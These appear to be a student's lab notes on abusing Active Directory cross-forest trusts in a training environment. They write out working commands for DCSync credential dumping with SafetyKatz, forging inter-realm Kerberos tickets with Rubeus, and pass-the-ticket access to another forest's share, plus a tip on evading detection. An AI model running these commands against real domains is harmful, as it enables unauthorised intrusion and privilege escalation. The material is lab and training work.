SID Filtering blocks the cross-domain attack we would try to elevate to EA across forests
- any SID between 500 (Administrator) and 1000 (first domain controller) is filtered out
	- can be misconfigured with user groups (i.e. if there is a group called "Computer Admins" that has tier 0 privileges, then it will have an SID of >1000, meaning it won't be filtered out)
- can only access resources that are explicitly shared across forests


Forge an inter-realm TGT using Rubeus
`C:\AD\Tools\Rubeus.exe silver /service:krbtgt\<DOMAIN> /rc4:<trust_key> /sid:S-1-5-21... /sids:S-1-5-21-...-519 /ldap /user:Administrator /nowrap`


Use the forged ticket
`C:\AD\Tools\Rubeus.exe asktgs /service:<SPN> /dc:<DC_name>.<target_DOMAIN> /ptt /ticket:<forged_ticket>`
- can try different tickets (like CIFS on each machine) to manually enumerate for accessible resources
- don't inject the SID history for EA (519) here -- can be used in detections


# Learning Objective 20

## With DA privileges on dollarcorp.moneycorp.local, get access to SharedWithDCorp share on the DC of eurocorp.local forest

Run DCSync against the external trusted domain to get the trust key
`C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\ecorp$" "exit"`
![[assets/Pasted image 20260224043315.png]]
![[assets/Pasted image 20260224043301.png]]


Forge an inter-realm TGT
`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt\DOLLARCORP.MONEYCORP.LOCAL /rc4:<trust_key> /sid:S-1-5-21... /ldap /user:Administrator /nowrap`
![[assets/Pasted image 20260224043456.png]]
![[assets/Pasted image 20260224043503.png]]


Use the ticket with asktgs module
`C:\AD\Tools\Rubeus.exe asktgs /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt /ticket:<forged_ticket>`
![[assets/Pasted image 20260224043610.png]]
![[assets/Pasted image 20260224043616.png]]


access an explicitly shared resource
`dir \\eurocorp-dc.eurocorp.localSharedwithDCorp\`
![[assets/Pasted image 20260224043654.png]]

can't access other resources (like C drive)
![[assets/Pasted image 20260224043717.png]]


**can only know if a resource is explicitly shared when trying to access it -- request the service ticket with asktgs module in Rubeus, then check if we can actually use it**


